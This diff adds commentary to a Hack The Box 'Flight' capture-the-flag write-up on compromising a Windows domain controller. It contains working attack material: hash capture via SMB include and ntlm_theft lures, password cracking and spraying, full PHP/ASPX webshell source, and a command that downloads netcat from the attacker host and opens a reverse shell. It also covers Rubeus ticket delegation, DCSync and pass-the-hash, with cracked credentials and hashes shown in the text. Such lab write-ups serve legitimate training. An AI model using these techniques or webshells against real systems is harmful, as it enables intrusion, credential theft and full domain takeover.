@@ -53,7 +53,17 @@ Host script results:
 |_  start_date: N/A
 ```
 
+This looks like a Windows DC with the domain name `flight.htb`, and a hostname of G0.
+
+Lots of ports to potentially look at. I’ll prioritize SMB and Web, and check in with LDAP, Kerberos, and DNS if I don’t find what I need from them.
+
+The site is for an airline:
+
 ![](../images/flight1.webp)
+
+Most the links are dead or just lead back to this page.
+
+Given the use of DNS names, I’ll fuzz port 80 for potential subdomains with `wfuzz`:
 
 ```bash
 ❯  wfuzz -c --hw=530 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://flight.htb" -H "Host: FUZZ.flight.htb"
@@ -75,17 +85,35 @@ Filtered Requests: 4988
 Requests/sec.: 112.0170
 ```
 
+I’ll add both to my `/etc/hosts` file along with the host name:
+
+```bash
+10.10.11.187 flight.htb school.flight.htb g0.flight.htb
+```
+
 `http://school.flight.htb/index.php?view=about.html`
 
+The site is for an aviation school:
+
 ![](../images/flight2.webp)
+
+The site is all placeholder text and a few page links, but nothing interesting. It’s a very common PHP structure where different pages on a site all use `index.php` with some parameter specifying what page to include. These are often vulnerable to path traversal (reading outside the current directory) and local file include (including PHP code that is executed) vulnerabilities.
+
+On a Linux box, I’d try to read `/etc/passwd`. Since this is Windows, I’ll try `C:\windows\system32\drivers\etc\hosts`, but it returns an error:
 
 `http://school.flight.htb/index.php?view=C:\Windows\System32\Drivers\etc\hosts`
 
 ![](../images/flight3.webp)
 
+In fact, just having just `view=\` results in the same blocked response. `view=.` returns nothing, but anything with `..` in it also results in the blocked message.
+I can try with `/` instead of `\`, make sure to use an absolute path, and it works:
+
 `http://school.flight.htb/index.php?view=C:/Windows/System32/drivers/etc/hosts`
 
 ![](../images/flight4.png)
+
+Nothing interesting in that file, but it proves directory traversal and file read. It’s not yet clear if it’s an include or just a read.
+Another way to include a file is over SMB. It won’t get anything that HTTP couldn’t get as far as execution, but the user will try to authenticate, and I could capture a NetNTLMv2 challenge/response (not really a hash, but often called one). I’ll start responder with `sudo responder -I tun0`, and then visit:
 
 `http://school.flight.htb/index.php?view=//10.10.14.27/smbFolder/test`
 
@@ -95,11 +123,15 @@ Requests/sec.: 112.0170
 svc_apache::flight:aaaaaaaaaaaaaaaa:f9e5ab7853f77ef2f50010223f54c359:010100000000000000af2624c4c4da01c157e905349152000000000001001000720045004400710056007600740074000300100072004500440071005600760074007400020010004e00560055004d004800440052005a00040010004e00560055004d004800440052005a000700080000af2624c4c4da01060004000200000008003000300000000000000000000000003000005dc19aecb7887e12ceb2adeca0a3dd353c3e3d5e883b5dcfcc20f40a2f0782390a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320037000000000000000000
 ```
 
+`john` will find the password used by the svc_apache account, `S@Ss!K@*t13` :
+
 ```bash
 ❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
 
 S@Ss!K@*t13 (svc_apache)
 ```
+
+These creds work over SMB:
 
 ```bash
 ❯ nxc smb 10.129.95.34 -u 'svc_apache' -p 'S@Ss!K@*t13' --users
@@ -122,7 +154,7 @@ svc_apache                    2022-09-22 20:08:23 0       Service Apache web
 O.Possum                      2022-09-22 20:08:23 0       Helpdesk 
 ```
 
-users.txt
+I'll create a list of all the usernames to try a password spraying.
 
 ```bash
 Guest
@@ -160,7 +192,7 @@ SMB         10.129.95.34    445    G0               [+] flight.htb\svc_apache:S@
 SMB         10.129.95.34    445    G0               [-] flight.htb\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
 ```
 
-`S.Moon:S@Ss!K@*t13`
+And we got a hit: `S.Moon:S@Ss!K@*t13`. Looking for share folders we see that we have write access in `Shared` folder. With write access to an otherwise empty share named `Shared`, there are files I can drop that might entice any legit visiting user to try to authenticate to my host. [This post](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) has a list of some of the ways this can be done. [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) is a nice tool to create a bunch of these files.
 
 ```bash
 ❯ nxc smb 10.129.95.34 -u 's.moon' -p 'S@Ss!K@*t13' --shares
@@ -176,6 +208,8 @@ SYSVOL          READ            Logon server share
 Users           READ            
 Web             READ            
 ```
+
+I’ll use `ntml_theft.py` to create all the files.
 
 ```bash
 ❯ ntlm_theft.py -g all -s 10.10.14.27 -f test
@@ -204,6 +238,8 @@ Created: test/desktop.ini (BROWSE TO FOLDER)
 Generation Complete.
 ```
 
+Connecting from the directory with the `ntlm_theft` output, I’ll upload desktop.ini to the share.
+
 ```bash
 ❯ smbclient '//10.129.95.34/shared' -U 'S.Moon%S@Ss!K@*t13'
 
@@ -211,17 +247,23 @@ smb: \> lcd test
 smb: \> put desktop.ini
 ```
 
+With `responder` or some smbServer running, after a minute we will get a connection to our server from `c.bum.`
+
 ```bash
 ❯ smbserver.py smbFolder $(pwd) -smb2support
 
 c.bum::flight.htb:aaaaaaaaaaaaaaaa:31f4405fd28b2e0c09685c0c7d169ba3:0101000000000000801b1a22d7c4da01b7cb31957bd0c2c800000000010010006e00510063006e007300510071004300030010006e00510063006e007300510071004300020010004300500066006a0043006d0056004200040010004300500066006a0043006d005600420007000800801b1a22d7c4da01060004000200000008003000300000000000000000000000003000005dc19aecb7887e12ceb2adeca0a3dd353c3e3d5e883b5dcfcc20f40a2f0782390a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320037000000000000000000
 ```
 
-```bah
+`john` will crack his hash.
+
+```bash
 ❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
 
 Tikkycoll_431012284 (c.bum)
 ```
+
+If we look over again to the shared folders, we see that we have write access to the Web, it means that we can upload a webshell in PHP.
 
 ```bash
 ❯ nxc smb 10.129.129.49 -u 'c.bum' -p 'Tikkycoll_431012284' --shares
@@ -246,6 +288,8 @@ Web             READ,WRITE
 ?>
 ```
 
+Upload the webshell using `smbclient`
+
 ```bash
 ❯ smbclient '//10.129.129.49/Web' -U 'c.bum%Tikkycoll_431012284'
 
@@ -253,7 +297,13 @@ smb: \> cd school.flight.htb
 smb: \school.flight.htb\> put rce.php
 ```
 
-`http://school.flight.htb/rce.php?cmd=whoami`
+```bash
+❯ curl http://school.flight.htb/rce.php?cmd=whoami
+
+flight\svc_apache
+```
+
+To go from webshell to shell, I’ll upload `nc64.exe` to the same folder.
 
 `http://school.flight.htb/rce.php?cmd=curl 10.10.14.27/nc.exe -o nc.exe; nc.exe 10.10.14.27 443 -e cmd`
 
@@ -264,7 +314,9 @@ C:\xampp\htdocs\school.flight.htb> whoami
 flight\svc_apache
 ```
 
-```
+Inside, we will see that are 2 web folders in `C:\` (inetpub & xampp)
+
+```powershell
 C:\> dir C:\
 
 Mode                LastWriteTime         Length Name                                                                  
@@ -280,7 +332,9 @@ d-----       10/21/2022  11:52 AM                Windows
 d-----        9/22/2022   1:16 PM                xampp                                                                 
 ```
 
-```
+If we list the privileges that we have over `C:\inetpub\development` we will see that the user `c.bum` has write access.
+
+```powershell
 PS C:\inetpub> icacls development
 icacls development
 development flight\C.Bum:(OI)(CI)(W)
@@ -296,7 +350,20 @@ development flight\C.Bum:(OI)(CI)(W)
 
 ```
 
+We can pivot to `c.bun` using `RunasCs.exe`:
+
+```powershell
+C:\Windows\Temp> .\RunasCs.exe c.bum Tikkycoll_431012284 cmd.exe -r 10.10.14.27:443
 ```
+
+```powershell
+C:\Windows\System32> whoami
+flight\c.bum
+```
+
+The internal web seems to be running on port 8000:
+
+```powershell
 C:\> netstat -a
 
   TCP    0.0.0.0:80             g0:0                   LISTENING
@@ -325,15 +392,90 @@ C:\> netstat -a
   TCP    0.0.0.0:58724          g0:0                   LISTENING
 ```
 
-Port 8000 is open, let's bring it back to us using chisel
+Let's bring it back to us using chisel.
+
+```bash
+❯ chisel server -p 1234 --reverse
+
+C:\Windows\Temp> .\chisel.exe client 10.10.14.27:1234 R:8000:127.0.0.1:8000 
+```
 
 ![](../images/flight5.png)
 
+Nothing useful on the page. There’s a `/contact.html` that doesn’t have any useful information either.
+
+The response headers show that the site is hosted by IIS (rather than Apache):
+
+```http
+HTTP/1.1 200 OK
+Content-Type: text/html
+Last-Modified: Mon, 16 Apr 2018 21:23:22 GMT
+Accept-Ranges: bytes
+ETag: "019c25c9d5d31:0"
+Server: Microsoft-IIS/10.0
+X-Powered-By: ASP.NET
+Date: Wed, 26 Oct 2022 01:47:57 GMT
+Connection: close
+Content-Length: 9371
+```
+
+They also show `X-Powered-By: ASP.NET`. Typically that means that `.aspx` type pages are in use. As we have write access with `c.bum` in `C:\inetpub\development` I will try to upload a aspx webshell.
+
+```aspx
+<%@ Page Language="VB" Debug="true" %>
+<%@ import Namespace="system.IO" %>
+<%@ import Namespace="System.Diagnostics" %>
+
+<script runat="server">      
+
+Sub RunCmd(Src As Object, E As EventArgs)            
+  Dim myProcess As New Process()            
+  Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)            
+  myProcessStartInfo.UseShellExecute = false            
+  myProcessStartInfo.RedirectStandardOutput = true            
+  myProcess.StartInfo = myProcessStartInfo            
+  myProcessStartInfo.Arguments=xcmd.text            
+  myProcess.Start()            
+
+  Dim myStreamReader As StreamReader = myProcess.StandardOutput            
+  Dim myString As String = myStreamReader.Readtoend()            
+  myProcess.Close()            
+  mystring=replace(mystring,"<","&lt;")            
+  mystring=replace(mystring,">","&gt;")            
+  result.text= vbcrlf & "<pre>" & mystring & "</pre>"    
+End Sub
+
+</script>
+
+<html>
+<body>    
+<form runat="server">        
+<p><asp:Label id="L_p" runat="server" width="80px">Program</asp:Label>        
+<asp:TextBox id="xpath" runat="server" Width="300px">c:\windows\system32\cmd.exe</asp:TextBox>        
+<p><asp:Label id="L_a" runat="server" width="80px">Arguments</asp:Label>        
+<asp:TextBox id="xcmd" runat="server" Width="300px" Text="/c net user">/c net user</asp:TextBox>        
+<p><asp:Button id="Button" onclick="runcmd" runat="server" Width="100px" Text="Run"></asp:Button>        
+<p><asp:Label id="result" runat="server"></asp:Label>       
+</form>
+</body>
+</html>
+```
+
+Once done, we can try to execute commands. At my `nc` listener, I get a shell as defaultapppool:
+
 ![](../images/flight6.png)
 
-As we have a service account we can create a ticket
+```bash
+❯ rlwrap -cAr nc -lvnp 443
 
+C:\Windows\System32\inetsrv>whoami 
+iis apppool\defaultapppool
 ```
+
+`iis apppool\defaultapppool` is a Microsoft Virtual Account. One thing about these accounts is that when they authenticate over the network, they do so as the machine account. 
+To abuse this, I’ll just ask the machine for a ticket for the machine account over the network using `Rubeus`.
+
+```powershell
 PS:\> .\rubeus.exe tgtdeleg /nowrap
 
    ______        _                      
@@ -361,16 +503,28 @@ PS:\> .\rubeus.exe tgtdeleg /nowrap
       doIFVDCCBVCgAwIBBaEDAgEWooIEZDCCBGBhggRcMIIEWKADAgEFoQwbCkZMSUdIVC5IVEKiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkZMSUdIVC5IVEKjggQgMIIEHKADAgESoQMCAQKiggQOBIIECsm+aGmM0oXWNEEUXlQtyz4BLV4fO5PCUTxT0GpqqXXtUJzjx9Oea/mMnr4Pb4f+dT8CZ4s/8IF5lvWzd3SVVig94nSnJh3szA/lnyCoHlnnEQmvZLlOOJiT5ohkyb7Upm7Gqx/SLx923t7YjbTHMJkrDvdWSEiZZoLNVbfSmdXwEpfeZ7qbTIZ2Y8CGsQuBIxghEDHeGPMObJi4lnUAEnkcOzNJPCoBBb14gcexAOtu0548oakUbrgqbDtw/FBuwR9uVJ1dWc7N4/NCLQwpljvISkH/pvVjx9TXbszlAhcGvfEUg9MQ2qRfzzx2LBoHMufq/cXLsA4B8VXSAlVJkZdC/tiGXlErmyEblKLGM4awkVGJHjK5AoR6z6ZIjLwikEbQS55JI1vlzCCWDiO9xJJUYwKmv0/ASIZ24jmLE89Nrzz8+2em/BrehWSuAxv3oqDMOpmY5ZHxCve/CBmgt0AvcbjJk8qESATAriPn9JE0LWNd2204ISKbYzLY6rSwFbENFjMQAh1Yq0VKP/3fQHeotZkf/7FrAJwoeOviTAyXNWJAuJzaSMuxibbEld5NdAiZW0ZqTWvVp/EFuULah6iubeZQpWR1P405A+OrT+e6caOIFkNtt0sX1FLWINdSEL91rZ7PKlksEYqlCGIWLBimybt+AZcZ4X26JlGSFX5vNk32iMRKzFsynAZOiX3yHK/JBUkdEPulheri56HqY1TEgw0tbbdSvvJpBuNuYx2RspL8gM1OsN6A6puCxXpP0JROvlr/0OC5tP+p3Be/IfA93ea8F6Kb8ZllLu5B0QT0+dhRaqa0Zf5V5pEgq83zfrwA1WsgYN90A9LwOZQrqTIWT38/A0SAXYmZ7k4eV8+9BjFujHMqtvTASWyoGuGiefrgvgVud25AqmX2zK2h4YWlzLTLR/9sOnhmI9T5QH667Z6pLx5bVoBMCv5TlkdFEmirQZQE2MPjkyIeRBpBQKHYNwVZv6mhgjFs2mYnGspLmxISOdwOuhSEC7KntbKqARt2ncYDebhLj4HSiBMVvL/nEWn/sNqu8FBmmMRff6TfG/eeeUhChesXBkZLS6+rSTQwqAexwUUqX4EsrIOttenA8kc9ocDUh6h4N98Nthc8MZwe3GNKM9Tq+XA4WJrmdciXq0tbU6SjwtoKytw+uxEDneK4TnQ3ench7z9fGQxg8dA7cmuwRWZXEQyvOvkajzXt5MFz2WbH38hg2A6GvFg2APWxppIM7zB4Q6N06t3dMJTVgu+XR2LKxwDpGAVfaCIysb0sVXy4sGpoGWUn90GzpnaPHQG19Cz6HYnQ9ed1dj7XnKq5d/OZSmK4RooEfxcSV3wq+11bLn5xh8FbzqVejEd2cUhsDpWno4HbMIHYoAMCAQCigdAEgc19gcowgceggcQwgcEwgb6gKzApoAMCARKhIgQgRdZEzWb219cQpCNRe3lQVVDuryNnVYJ4u/M1TAYteY6hDBsKRkxJR0hULkhUQqIQMA6gAwIBAaEHMAUbA0cwJKMHAwUAYKEAAKURGA8yMDI0MDYyNDExMTQ1MlqmERgPMjAyNDA2MjQyMTE0NTJapxEYDzIwMjQwNzAxMTExNDUyWqgMGwpGTElHSFQuSFRCqR8wHaADAgECoRYwFBsGa3JidGd0GwpGTElHSFQuSFRC
 ```
 
-```
+With a ticket for the machine account, I can do a DCSync attack, effectively telling the DC that I’d like to replicate all the information in it to myself. To do that, I’ll need to configure Kerberos on my VM to use the ticket I just dumped.
+
+I’ll decode the base64 ticket and save it as `ticket.kirbi`. Then `kirbi2ccache` will convert it to the format needed by my Linux system:
+
+```bash
 ❯ echo 'doIFVDCCBVCgAwIBBaEDAgEWooIEZDCCBGBhggRcMIIEWKADAgEFoQwbCkZMSUdIVC5IVEKiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkZMSUdIVC5IVEKjggQgMIIEHKADAgESoQMCAQKiggQOBIIECsm+aGmM0oXWNEEUXlQtyz4BLV4fO5PCUTxT0GpqqXXtUJzjx9Oea/mMnr4Pb4f+dT8CZ4s/8IF5lvWzd3SVVig94nSnJh3szA/lnyCoHlnnEQmvZLlOOJiT5ohkyb7Upm7Gqx/SLx923t7YjbTHMJkrDvdWSEiZZoLNVbfSmdXwEpfeZ7qbTIZ2Y8CGsQuBIxghEDHeGPMObJi4lnUAEnkcOzNJPCoBBb14gcexAOtu0548oakUbrgqbDtw/FBuwR9uVJ1dWc7N4/NCLQwpljvISkH/pvVjx9TXbszlAhcGvfEUg9MQ2qRfzzx2LBoHMufq/cXLsA4B8VXSAlVJkZdC/tiGXlErmyEblKLGM4awkVGJHjK5AoR6z6ZIjLwikEbQS55JI1vlzCCWDiO9xJJUYwKmv0/ASIZ24jmLE89Nrzz8+2em/BrehWSuAxv3oqDMOpmY5ZHxCve/CBmgt0AvcbjJk8qESATAriPn9JE0LWNd2204ISKbYzLY6rSwFbENFjMQAh1Yq0VKP/3fQHeotZkf/7FrAJwoeOviTAyXNWJAuJzaSMuxibbEld5NdAiZW0ZqTWvVp/EFuULah6iubeZQpWR1P405A+OrT+e6caOIFkNtt0sX1FLWINdSEL91rZ7PKlksEYqlCGIWLBimybt+AZcZ4X26JlGSFX5vNk32iMRKzFsynAZOiX3yHK/JBUkdEPulheri56HqY1TEgw0tbbdSvvJpBuNuYx2RspL8gM1OsN6A6puCxXpP0JROvlr/0OC5tP+p3Be/IfA93ea8F6Kb8ZllLu5B0QT0+dhRaqa0Zf5V5pEgq83zfrwA1WsgYN90A9LwOZQrqTIWT38/A0SAXYmZ7k4eV8+9BjFujHMqtvTASWyoGuGiefrgvgVud25AqmX2zK2h4YWlzLTLR/9sOnhmI9T5QH667Z6pLx5bVoBMCv5TlkdFEmirQZQE2MPjkyIeRBpBQKHYNwVZv6mhgjFs2mYnGspLmxISOdwOuhSEC7KntbKqARt2ncYDebhLj4HSiBMVvL/nEWn/sNqu8FBmmMRff6TfG/eeeUhChesXBkZLS6+rSTQwqAexwUUqX4EsrIOttenA8kc9ocDUh6h4N98Nthc8MZwe3GNKM9Tq+XA4WJrmdciXq0tbU6SjwtoKytw+uxEDneK4TnQ3ench7z9fGQxg8dA7cmuwRWZXEQyvOvkajzXt5MFz2WbH38hg2A6GvFg2APWxppIM7zB4Q6N06t3dMJTVgu+XR2LKxwDpGAVfaCIysb0sVXy4sGpoGWUn90GzpnaPHQG19Cz6HYnQ9ed1dj7XnKq5d/OZSmK4RooEfxcSV3wq+11bLn5xh8FbzqVejEd2cUhsDpWno4HbMIHYoAMCAQCigdAEgc19gcowgceggcQwgcEwgb6gKzApoAMCARKhIgQgRdZEzWb219cQpCNRe3lQVVDuryNnVYJ4u/M1TAYteY6hDBsKRkxJR0hULkhUQqIQMA6gAwIBAaEHMAUbA0cwJKMHAwUAYKEAAKURGA8yMDI0MDYyNDExMTQ1MlqmERgPMjAyNDA2MjQyMTE0NTJapxEYDzIwMjQwNzAxMTExNDUyWqgMGwpGTElHSFQuSFRCqR8wHaADAgECoRYwFBsGa3JidGd0GwpGTElHSFQuSFRC' | base64 -d | tee ticket.kirbi
 ```
 
-```
+```bash
 ❯ minikerberos-kirbi2ccache ticket.kirbi ticket.ccache
 ```
 
+Now I will export the environment variable `KRB5CCNAME` to hold the ticket:
+
+```bash
+❯ export KRB5CCNAME=ticket.ccache
 ```
-❯ ntpdate 10.129.129.49
+
+Before executing `secretsdump.py` we need to fix the time, so it won't broke. 
+
+```bash
+❯ sudo ntpdate 10.129.129.49
 
 ❯ secretsdump.py -k -no-pass g0.flight.htb
 
@@ -392,3 +546,19 @@ O.Possum:1613:aad3b435b51404eeaad3b435b51404ee:68ec50916875888f44caff424cd3f8ac:
 G0$:1001:aad3b435b51404eeaad3b435b51404ee:140547f31f4dbb4599dc90ea84c27e6b:::
 [*] Cleaning up... 
 ```
+
+Those hashes work for a pass the hash attack.
+
+```bash
+❯ nxc smb 10.129.129.49 -u 'Administrator' -H '43bbfc530bab76141b12c8446e30c17c' -x 'type C:\Users\Administrator\Desktop\root.txt'
+
+SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
+SMB         flight.htb      445    G0               [+] flight.htb\Administrator:43bbfc530bab76141b12c8446e30c17c (Pwn3d!)
+
+74be1697************************
+```
+
+**Reference:**
+
+- https://app.hackthebox.com/machines/510
+- https://0xdf.gitlab.io/2023/05/06/htb-flight.html
